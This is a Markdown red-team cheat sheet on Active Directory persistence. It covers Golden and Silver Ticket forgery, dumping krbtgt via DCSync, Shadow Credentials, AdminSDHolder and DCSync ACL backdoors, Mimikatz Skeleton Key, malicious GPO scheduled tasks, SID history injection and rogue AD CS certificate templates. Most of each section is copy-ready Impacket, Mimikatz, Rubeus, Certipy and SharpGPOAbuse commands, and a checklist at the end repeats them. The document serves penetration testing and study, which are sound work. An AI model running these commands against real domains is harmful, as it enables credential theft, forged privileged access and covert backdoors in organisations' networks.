# Persistence

Persistence in Active Directory means creating or maintaining a way to regain privileged access after the initial compromise.

In AD environments, persistence can be based on:

- Kerberos ticket forgery
- compromised `krbtgt` keys
- service account keys
- certificate-based authentication
- AdminSDHolder and SDProp
- delegated DCSync rights
- malicious GPO changes
- SID history abuse
- rogue or weakened AD CS templates
- domain controller or LSASS-level modifications

Useful resources:

- [The Hacker Recipes - Golden Ticket](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden)
- [The Hacker Recipes - Silver Ticket](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver)
- [The Hacker Recipes - Shadow Credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
- [The Hacker Recipes - DACL Abuse](https://www.thehacker.recipes/ad/movement/dacl/)
- [The Hacker Recipes - AD CS](https://www.thehacker.recipes/ad/movement/ad-cs/)
- [HackTricks - Active Directory Methodology](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
- [Certipy](https://github.com/ly4k/Certipy)
- [Impacket](https://github.com/fortra/impacket)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)
- [WADComs](https://wadcoms.github.io/)

Basic variables used in examples:

```bash
export DOMAIN=corp.local
export REALM=CORP.LOCAL
export NETBIOS=CORP
export USER=alice
export PASS='Password123!'
export NTLM='8846f7eaee8fb117ad06bdd830b7586c'
export DC_IP=10.10.10.10
export DC_HOST=dc01.corp.local
export DOMAIN_DN='DC=corp,DC=local'
export DOMAIN_SID='S-1-5-21-1111111111-2222222222-3333333333'
export TARGET_USER=bob
export TARGET_COMPUTER='WS01$'
export TARGET_GROUP='Domain Admins'
```

## Golden Ticket

A Golden Ticket is a forged Kerberos TGT created with the `krbtgt` account key.

If the `krbtgt` hash or AES key is known, a forged TGT can be created for a chosen user and group set.

Requirements:

| Requirement | Notes |
| --- | --- |
| `krbtgt` NT hash or AES key | Key material used to sign/encrypt TGTs. |
| Domain SID | Required for ticket fields. |
| Domain name | Kerberos realm context. |
| Target username | Existing or forged identity. |
| Group RIDs | Privilege level inside the forged PAC. |

Dump `krbtgt` with DCSync when explicitly allowed:

```bash
secretsdump.py $DOMAIN/$USER:"$PASS"@$DC_IP -just-dc-user krbtgt
```

Mimikatz DCSync:

```cmd
mimikatz.exe
lsadump::dcsync /domain:corp.local /user:krbtgt
```

Create Golden Ticket with Impacket:

```bash
ticketer.py -nthash KRBTGT_NT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN Administrator
```

With privileged group RIDs:

```bash
ticketer.py -nthash KRBTGT_NT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN -groups 512,513,518,519,520 Administrator
```

With AES key:

```bash
ticketer.py -aesKey KRBTGT_AES256_KEY -domain-sid $DOMAIN_SID -domain $DOMAIN Administrator
```

Use the ticket:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache
klist
```

Validate Kerberos access:

```bash
wmiexec.py -k -no-pass $DOMAIN/Administrator@$DC_HOST
```

Rubeus Golden Ticket:

```powershell
Rubeus.exe golden /rc4:KRBTGT_NT_HASH /user:Administrator /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /id:500 /groups:512,513,518,519,520 /ptt
```

Mimikatz Golden Ticket:

```cmd
mimikatz.exe
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /krbtgt:KRBTGT_NT_HASH /id:500 /groups:512,513,518,519,520 /ptt
```

Common group RIDs:

| RID | Group |
| --- | --- |
| `512` | Domain Admins |
| `513` | Domain Users |
| `518` | Schema Admins |
| `519` | Enterprise Admins |
| `520` | Group Policy Creator Owners |

Important limitations:

| Item | Meaning |
| --- | --- |
| Domain-specific | One domain's `krbtgt` key does not automatically control another domain. |
| Ticket lifetime | Long lifetimes may stand out in logs. |
| `krbtgt` rotation | Rotating the key twice can invalidate old forged tickets. |
| AES vs RC4 | AES keys may be required in hardened environments. |
| Authorization still matters | The ticket must contain useful group/SID data. |

## Silver Ticket

A Silver Ticket is a forged Kerberos service ticket.

Unlike a Golden Ticket, it does not require the `krbtgt` key. It requires the key of the service account that owns the SPN.

Requirements:

| Requirement | Notes |
| --- | --- |
| Service account hash/key | Account owning the target SPN. |
| Target SPN | Example: `cifs/filesrv01.corp.local`. |
| Domain SID | Required for forged PAC fields. |
| Domain name | Kerberos realm context. |
| Target service | The ticket is service-specific. |

Common SPNs:

| SPN | Service |
| --- | --- |
| `cifs/host` | SMB / file shares. |
| `http/host` | Web service. |
| `mssqlsvc/host:1433` | MSSQL. |
| `ldap/dc` | LDAP. |
| `wsman/host` | WinRM. |
| `host/host` | Generic host service. |

Create Silver Ticket with Impacket:

```bash
ticketer.py -nthash SERVICE_NT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN -spn cifs/filesrv01.corp.local Administrator
```

Use the ticket:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache
klist
smbclient.py -k -no-pass $DOMAIN/Administrator@filesrv01.corp.local
```

MSSQL Silver Ticket:

```bash
ticketer.py -nthash SERVICE_NT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN -spn MSSQLSvc/sql01.corp.local:1433 Administrator
export KRB5CCNAME=$PWD/Administrator.ccache
mssqlclient.py -k -no-pass $DOMAIN/Administrator@sql01.corp.local
```

Rubeus Silver Ticket:

```powershell
Rubeus.exe silver /rc4:SERVICE_NT_HASH /user:Administrator /service:cifs/filesrv01.corp.local /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /id:500 /groups:512 /ptt
```

Mimikatz Silver Ticket:

```cmd
mimikatz.exe
kerberos::golden /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /target:filesrv01.corp.local /service:cifs /rc4:SERVICE_NT_HASH /user:Administrator /ptt
```

Important limitations:

| Item | Meaning |
| --- | --- |
| Service-specific | Ticket works only for the forged service/SPN. |
| Service key dependency | Password rotation invalidates the ticket. |
| SPN accuracy | Wrong SPN or hostname causes failure. |
| Authorization fields | PAC user/group fields still affect access. |

## Shadow Credentials

Shadow Credentials abuse the `msDS-KeyCredentialLink` attribute to add an alternate key credential to an AD user or computer object.

If an attacker can write this attribute, they may authenticate as the target using certificate-based Kerberos authentication.

Requirements:

| Requirement | Notes |
| --- | --- |
| Write access to target object | GenericWrite, GenericAll, WriteProperty, or equivalent. |
| AD CS / PKINIT support | Domain must support certificate-based Kerberos authentication. |
| Target user or computer | Object receiving the key credential. |
| Certipy / Whisker / equivalent tooling | Common tools for this path. |

Check for target control with BloodHound or PowerView:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs
Get-DomainObjectAcl -Identity bob -ResolveGUIDs
```

Add Shadow Credential with Certipy:

```bash
certipy shadow add -u "$USER@$DOMAIN" -p "$PASS" -account "$TARGET_USER" -dc-ip $DC_IP
```

Authenticate using the added credential:

```bash
certipy shadow auth -u "$USER@$DOMAIN" -p "$PASS" -account "$TARGET_USER" -dc-ip $DC_IP
```

Auto mode:

```bash
certipy shadow auto -u "$USER@$DOMAIN" -p "$PASS" -account "$TARGET_USER" -dc-ip $DC_IP
```

With hash:

```bash
certipy shadow add -u "$USER@$DOMAIN" -hashes :$NTLM -account "$TARGET_USER" -dc-ip $DC_IP
```

Against a computer object:

```bash
certipy shadow auto -u "$USER@$DOMAIN" -p "$PASS" -account "WS01$" -dc-ip $DC_IP
```

Check attribute with LDAP:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "$DOMAIN_DN" "(sAMAccountName=$TARGET_USER)" \
sAMAccountName msDS-KeyCredentialLink
```

Whisker-style Windows usage:

```cmd
Whisker.exe add /target:bob
Whisker.exe list /target:bob
Whisker.exe remove /target:bob /deviceid:<DeviceID>
```

Output artifacts may include:

| Artifact | Meaning |
| --- | --- |
| PFX | Certificate/private key material. |
| DeviceID | Identifier for the added key credential. |
| TGT | Kerberos ticket obtained through PKINIT. |
| NT hash | Sometimes derived after certificate authentication. |

Important limitations:

| Item | Meaning |
| --- | --- |
| PKINIT required | Without PKINIT, certificate auth path may fail. |
| Attribute visibility | `msDS-KeyCredentialLink` can be inspected. |
| Cleanup requires DeviceID | Track the added key credential. |
| Protected users | Some targets may have additional restrictions. |

## AdminSDHolder

AdminSDHolder is a special object whose ACL is periodically applied to protected privileged users and groups by SDProp.

Default DN:

```text
CN=AdminSDHolder,CN=System,DC=corp,DC=local
```

Protected objects commonly include members of:

```text
Domain Admins
Enterprise Admins
Schema Admins
Administrators
Account Operators
Server Operators
Backup Operators
Print Operators
```

Persistence idea:

```text
Modify AdminSDHolder ACL
SDProp propagates the ACL to protected objects
Controlled principal receives rights over protected users/groups
```

View AdminSDHolder ACL:

```powershell
Get-DomainObjectAcl -Identity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -ResolveGUIDs
```

Add ACL entry with PowerView if you have rights:

```powershell
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -PrincipalIdentity alice -Rights All
```

Impacket dacledit example:

```bash
dacledit.py -action write -rights FullControl -principal "$USER" \
-target-dn "CN=AdminSDHolder,CN=System,$DOMAIN_DN" "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP
```

Check protected users:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "$DOMAIN_DN" "(adminCount=1)" \
sAMAccountName distinguishedName memberOf
```

PowerView:

```powershell
Get-DomainUser -AdminCount
Get-DomainGroup -AdminCount
```

Check propagated ACL on a protected object:

```powershell
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
Get-DomainObjectAcl -Identity "Administrator" -ResolveGUIDs
```

Important limitations:

| Item | Meaning |
| --- | --- |
| SDProp timing | Propagation is periodic, not instant. |
| Protected-object only | Applies to protected users/groups. |
| Visible ACL change | AdminSDHolder ACL can be reviewed. |
| High-impact path | Treat as privileged persistence. |

## DCSync Backdoor

A DCSync backdoor means granting replication rights to a controlled user or group.

After that, the controlled principal can perform DCSync without being a Domain Admin.

Required rights usually include:

```text
DS-Replication-Get-Changes
DS-Replication-Get-Changes-All
```

Sometimes also:

```text
DS-Replication-Get-Changes-In-Filtered-Set
```

Grant DCSync rights with PowerView if you have WriteDACL over the domain root:

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity alice -Rights DCSync
```

Grant DCSync rights with Impacket dacledit:

```bash
dacledit.py -action write -rights DCSync -principal "$USER" -target-dn "$DOMAIN_DN" "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP
```

Check domain root ACL:

```powershell
Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs | Where-Object {
    $_.ObjectAceType -match "Replication"
}
```

Validate DCSync with one account:

```bash
secretsdump.py $DOMAIN/$USER:"$PASS"@$DC_IP -just-dc-user krbtgt
```

Validate with Mimikatz:

```cmd
mimikatz.exe
lsadump::dcsync /domain:corp.local /user:krbtgt
```

Common BloodHound edges:

```text
GetChanges
GetChangesAll
GetChangesInFilteredSet
DCSync
```

Important limitations:

| Item | Meaning |
| --- | --- |
| Domain root scope | Rights must apply to the domain naming context. |
| Replication rights are visible | ACL review can expose this backdoor. |
| DCSync is high-impact | Equivalent to domain credential extraction. |
| Rights may replicate | Query the same DC first if validation is inconsistent. |

## Skeleton Key

Skeleton Key is a memory-resident patch to the domain controller authentication process.

It allows authentication with a chosen password while keeping legitimate passwords working.

This is a domain-controller-level persistence technique and requires very high privileges on the DC.

Requirements:

| Requirement | Notes |
| --- | --- |
| Code execution on DC | Usually Domain Admin or equivalent. |
| LSASS access | Requires debug-level access. |
| Mimikatz or equivalent | Common tool. |
| Target DC memory | Patch is not normally persistent across reboot. |

Mimikatz Skeleton Key in a lab:

```cmd
mimikatz.exe
privilege::debug
misc::skeleton
```

After applying, authentication may work with the Skeleton Key password against that DC in vulnerable/lab conditions:

```cmd
net use \\dc01.corp.local\c$ /user:corp\alice mimikatz
```

Important limitations:

| Item | Meaning |
| --- | --- |
| DC-specific | Applies to the patched DC. |
| Memory-resident | Usually lost on reboot. |
| High detection value | LSASS patching is noisy and high-risk. |
| Compatibility-dependent | Modern protections may block or detect it. |
| Requires highest privileges | Not a low-privilege technique. |

Related checks:

```cmd
hostname
whoami /groups
klist
```

This technique should be limited to controlled labs or explicit assessment scope because it modifies authentication behavior on a domain controller.

## Malicious GPO

A malicious GPO persistence path abuses Group Policy to execute commands, add local admins, create scheduled tasks, modify registry keys, or deploy files.

This requires control over a GPO or the ability to link a controlled GPO to a useful OU/domain/site.

Common GPO persistence ideas:

| GPO action | Possible impact |
| --- | --- |
| Add local administrator | Controlled user becomes local admin on linked systems. |
| Scheduled task | Command execution on policy refresh. |
| Startup script | Computer-level execution. |
| Logon script | User-level execution. |
| Registry Run key | User or computer persistence. |
| Service creation | Persistent service deployment. |
| Firewall or policy change | Enable access path. |

Enumerate GPOs:

```powershell
Get-DomainGPO
Get-DomainOU | Select-Object name,gplink
```

Find GPO ACLs:

```powershell
Get-DomainObjectAcl -Identity "GPO_NAME_OR_GUID" -ResolveGUIDs
```

Find writable GPO paths:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.ObjectDN -match "CN=Policies"}
```

SYSVOL GPO path format:

```text
\\corp.local\SYSVOL\corp.local\Policies\{GPO-GUID}\
```

SharpGPOAbuse add local admin:

```cmd
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount CORP\alice --GPOName "Workstation Policy"
```

SharpGPOAbuse add computer task:

```cmd
SharpGPOAbuse.exe --AddComputerTask --TaskName "Updater" --Author CORP\alice --Command "cmd.exe" --Arguments "/c whoami > C:\Windows\Temp\gpo.txt" --GPOName "Workstation Policy"
```

SharpGPOAbuse add user task:

```cmd
SharpGPOAbuse.exe --AddUserTask --TaskName "Updater" --Author CORP\alice --Command "cmd.exe" --Arguments "/c whoami > %TEMP%\gpo.txt" --GPOName "User Policy"
```

Force policy update on a target host if authorized:

```cmd
gpupdate /force
```

Remote policy update through PowerShell where allowed:

```powershell
Invoke-GPUpdate -Computer HOSTNAME -Force
```

Check local admin result:

```cmd
net localgroup administrators
```

Check task result:

```cmd
schtasks /query /fo LIST /v
```

Important limitations:

| Item | Meaning |
| --- | --- |
| GPO scope matters | Only linked and applicable users/computers receive changes. |
| Security filtering matters | Not all objects under an OU receive the GPO. |
| Policy refresh delay | GPO application is not always immediate. |
| SYSVOL files are visible | GPO changes can be inspected. |
| High blast radius | Domain-wide links can affect many systems. |

## SID History

`sIDHistory` is used during account/domain migrations so a user can retain access tied to old SIDs.

If abused, privileged SIDs can be added to a controlled account or forged into tickets.

Search for SID history:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "$DOMAIN_DN" "(sIDHistory=*)" \
sAMAccountName objectSid sIDHistory
```

PowerView:

```powershell
Get-DomainUser -LDAPFilter "(sIDHistory=*)" -Properties sidhistory
Get-DomainObject -LDAPFilter "(sIDHistory=*)"
```

Common privileged SID suffixes:

| SID suffix | Meaning |
| --- | --- |
| `-512` | Domain Admins |
| `-518` | Schema Admins |
| `-519` | Enterprise Admins |
| `-520` | Group Policy Creator Owners |

Golden Ticket with extra SID:

```bash
ticketer.py -nthash KRBTGT_NT_HASH \
-domain-sid $DOMAIN_SID \
-domain $DOMAIN \
-extra-sid ${DOMAIN_SID}-512 \
Administrator
```

Mimikatz Golden Ticket with extra SID:

```cmd
kerberos::golden /user:Administrator /domain:corp.local /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /sids:DOMAIN_SID-512 /ptt
```

DCShadow-style SID history modification in a controlled lab:

```cmd
mimikatz.exe
privilege::debug
lsadump::dcshadow /object:CN=TargetUser,CN=Users,DC=corp,DC=local /attribute:sIDHistory /value:S-1-5-21-1111111111-2222222222-3333333333-512
lsadump::dcshadow /push
```

Validate token or ticket context:

```cmd
whoami /groups
klist
```

Important limitations:

| Item | Meaning |
| --- | --- |
| SID filtering | Cross-domain SIDs may be filtered. |
| Token refresh | User may need new logon or new ticket. |
| Wrong SID | No useful privilege is gained. |
| Visible attribute | `sIDHistory` can be queried. |

## Rogue Certificate Template

A rogue certificate template persistence path abuses AD CS template control.

If an attacker can create or modify a certificate template, they may create a template that allows certificate-based authentication as another identity.

Common dangerous template properties:

| Property | Why it matters |
| --- | --- |
| Client Authentication EKU | Certificate can be used for authentication. |
| Enrollee supplies subject | Requester controls subject/SAN. |
| Broad enrollment rights | Many users can request certificates. |
| No manager approval | Certificate can be issued automatically. |
| No authorized signatures | No extra approval/signature requirement. |
| Template ACL write access | Attacker can weaken or modify template. |
| Published on CA | Template is actually usable for enrollment. |

Find AD CS issues with Certipy:

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DC_IP -vulnerable
```

Export detailed template data:

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DC_IP -v
```

Find templates with LDAP:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$DOMAIN_DN" \
"(objectClass=pKICertificateTemplate)" \
cn displayName pKIExtendedKeyUsage msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag
```

Find Enterprise CAs:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,$DOMAIN_DN" \
"(objectClass=pKIEnrollmentService)" \
cn dNSHostName certificateTemplates
```

Certipy template modification examples depend on the exact template and rights. A common lab flow is:

```bash
certipy template -u "$USER@$DOMAIN" -p "$PASS" -template VulnerableTemplate -dc-ip $DC_IP
```

Request certificate from a vulnerable or modified template:

```bash
certipy req -u "$USER@$DOMAIN" -p "$PASS" -ca "CORP-CA" -template VulnerableTemplate -upn administrator@corp.local -dc-ip $DC_IP
```

Authenticate with issued certificate:

```bash
certipy auth -pfx administrator.pfx -dc-ip $DC_IP
```

Check output:

```text
TGT
NT hash
ccache
```

Use Kerberos cache:

```bash
export KRB5CCNAME=$PWD/administrator.ccache
klist
```

Important limitations:

| Item | Meaning |
| --- | --- |
| Template must be enabled | CA must issue the template. |
| Enrollment rights required | Requester needs enroll permission. |
| Authentication EKU required | Certificate must be valid for authentication path. |
| Strong mapping changes may affect abuse | Certificate mapping rules matter. |
| Template changes are visible | AD CS template attributes can be reviewed. |

## Persistence Checklist

- [ ] **Confirm current privilege level**

  ```cmd
  whoami
  whoami /groups
  ```

  ```bash
  nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN
  nxc smb $DC_IP -u $USER -p "$PASS" -d $DOMAIN
  ```

- [ ] **Identify persistence material already obtained**

  ```text
  krbtgt NT hash:
  krbtgt AES key:
  Service account hash:
  Domain SID:
  DCSync rights:
  AD CS control:
  GPO control:
  AdminSDHolder control:
  Target object write rights:
  ```

- [ ] **Check Golden Ticket prerequisites**

  ```bash
  secretsdump.py $DOMAIN/$USER:"$PASS"@$DC_IP -just-dc-user krbtgt
  ```

  ```bash
  ticketer.py -nthash KRBTGT_NT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN Administrator
  ```

- [ ] **Check Silver Ticket prerequisites**

  ```text
  Service account:
  Service hash/key:
  SPN:
  Target host:
  Domain SID:
  ```

  ```bash
  ticketer.py -nthash SERVICE_NT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN -spn cifs/filesrv01.corp.local Administrator
  ```

- [ ] **Check Shadow Credentials path**

  ```powershell
  Find-InterestingDomainAcl -ResolveGUIDs
  ```

  ```bash
  certipy shadow auto -u "$USER@$DOMAIN" -p "$PASS" -account "$TARGET_USER" -dc-ip $DC_IP
  ```

- [ ] **Check AdminSDHolder path**

  ```powershell
  Get-DomainObjectAcl -Identity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -ResolveGUIDs
  ```

  ```bash
  ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
  -b "$DOMAIN_DN" "(adminCount=1)" \
  sAMAccountName distinguishedName memberOf
  ```

- [ ] **Check DCSync backdoor path**

  ```powershell
  Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity alice -Rights DCSync
  ```

  ```bash
  secretsdump.py $DOMAIN/$USER:"$PASS"@$DC_IP -just-dc-user krbtgt
  ```

- [ ] **Check Skeleton Key only in controlled lab**

  ```cmd
  mimikatz.exe
  privilege::debug
  misc::skeleton
  ```

- [ ] **Check malicious GPO path**

  ```powershell
  Get-DomainGPO
  Get-DomainOU | Select-Object name,gplink
  Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.ObjectDN -match "CN=Policies"}
  ```

  ```cmd
  SharpGPOAbuse.exe --AddLocalAdmin --UserAccount CORP\alice --GPOName "Workstation Policy"
  ```

- [ ] **Check SID history path**

  ```bash
  ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
  -b "$DOMAIN_DN" "(sIDHistory=*)" \
  sAMAccountName objectSid sIDHistory
  ```

  ```bash
  ticketer.py -nthash KRBTGT_NT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN -extra-sid ${DOMAIN_SID}-512 Administrator
  ```

- [ ] **Check rogue certificate template path**

  ```bash
  certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DC_IP -vulnerable
  ```

  ```bash
  certipy req -u "$USER@$DOMAIN" -p "$PASS" -ca "CORP-CA" -template VulnerableTemplate -upn administrator@corp.local -dc-ip $DC_IP
  certipy auth -pfx administrator.pfx -dc-ip $DC_IP
  ```

- [ ] **Validate persistence access path**

  ```bash
  export KRB5CCNAME=$PWD/Administrator.ccache
  klist
  wmiexec.py -k -no-pass $DOMAIN/Administrator@$DC_HOST
  ```

- [ ] **Track cleanup requirements**

  ```text
  Ticket files:
  PFX files:
  Added key credentials:
  Modified ACLs:
  Modified GPOs:
  Added DCSync rights:
  Modified templates:
  Added SID history:
  Created machine accounts:
  ```

- [ ] **Keep artifacts separated**

  ```text
  Hashes:
  AES keys:
  Tickets:
  Certificates:
  DCSync output:
  LDAP exports:
  GPO evidence:
  AD CS output:
  Command output:
  ```
